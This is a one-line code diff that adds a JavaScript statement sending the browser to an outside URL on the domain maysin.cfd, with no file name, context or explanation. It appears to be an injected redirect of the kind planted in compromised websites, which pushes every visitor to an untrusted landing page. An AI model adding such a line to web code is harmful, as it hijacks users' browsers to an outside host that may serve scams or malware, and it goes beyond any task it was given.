@@ -1,0 +1,1 @@
+window.location.href = "https://maysin.cfd/vAe/go?sid=7747";
